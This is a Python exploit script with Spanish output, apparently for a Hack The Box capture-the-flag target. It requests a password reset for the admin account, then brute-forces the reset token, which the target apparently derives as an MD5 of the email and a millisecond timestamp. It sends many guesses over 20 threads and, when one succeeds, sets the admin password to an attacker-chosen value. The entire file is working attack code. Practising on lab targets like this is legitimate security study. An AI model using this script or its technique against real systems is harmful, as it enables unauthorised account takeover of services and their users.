#!/usr/bin/env python3
import requests
import hashlib
import time
import threading
from concurrent.futures import ThreadPoolExecutor


BASE = 'http://83.136.254.202:48031'
ADMIN = 'admin@hackthebox.com'
NEW_PWD = 'SuperSegura123!'

def md5_hex(s: str) -> str:
    """Generate MD5 hash of string"""
    return hashlib.md5(s.encode()).hexdigest()

def try_token(timestamp, session):
    """Try a single token"""
    seed = ADMIN + str(timestamp)
    token = md5_hex(seed)
    
    data = {
        'email': ADMIN,
        'token': token,
        'newPassword': NEW_PWD
    }
    
    try:
        r = session.post(f'{BASE}/api/reset-password', json=data, timeout=3)
        if r.status_code == 200:
            result = r.json()
            if result.get('success'):
                return timestamp, token, True
    except Exception:
        pass
    
    return timestamp, token, False

def main():
    print('[+] Exploit RÁPIDO para cambiar password del admin')
    print(f'[+] URL: {BASE}')
    print(f'[+] Admin: {ADMIN}')
    print()
    
    # Step 1: Request password reset
    print('[+] Solicitando reset de password...')
    start_time = int(time.time() * 1000)
    
    try:
        r = requests.post(f'{BASE}/api/forgot-password', json={'email': ADMIN}, timeout=10)
        end_time = int(time.time() * 1000)
        
        if r.status_code != 200 or not r.json().get('success'):
            print('[-] Error al solicitar reset')
            return
            
        print(f'[*] Reset solicitado exitosamente')
    except Exception as e:
        print(f'[-] Error: {e}')
        return
    
   
    timestamps = []
    
    # Prioridad 1: Timestamps exactos
    timestamps.extend([start_time, end_time])
    
    
    for base in [start_time, end_time]:
        for offset in range(-200, 201, 1):
            timestamps.append(base + offset)
    
   
    for base in [start_time, end_time]:
        for offset in range(-1000, 1001, 10):
            timestamps.append(base + offset)
    
   
    seen = set()
    unique_timestamps = []
    for ts in timestamps:
        if ts not in seen:
            unique_timestamps.append(ts)
            seen.add(ts)
    
    print(f'[+] Probando {len(unique_timestamps)} timestamps con 20 hilos...')
    
    
    found = False
    with ThreadPoolExecutor(max_workers=20) as executor:

        sessions = [requests.Session() for _ in range(20)]
        
        
        futures = []
        for i, ts in enumerate(unique_timestamps):
            session = sessions[i % 20]
            future = executor.submit(try_token, ts, session)
            futures.append(future)
        
        
        for i, future in enumerate(futures):
            if i % 200 == 0:
                print(f'[*] Progreso: {i}/{len(futures)}')
            
            try:
                timestamp, token, success = future.result(timeout=1)
                if success:
                    print(f'\n[+] ¡TOKEN ENCONTRADO!')
                    print(f'[+] Timestamp: {timestamp}')
                    print(f'[+] Token: {token}')
                    print(f'[+] Password cambiada a: {NEW_PWD}')
                    print(f'\n[+] Login: {ADMIN} / {NEW_PWD}')
                    found = True
                    # Cancelar trabajos restantes
                    for remaining_future in futures[i+1:]:
                        remaining_future.cancel()
                    break
            except Exception:
                continue
    
    if not found:
        print('\n[-] Token no encontrado. Intenta ejecutar de nuevo.')

if __name__ == '__main__':
    main()
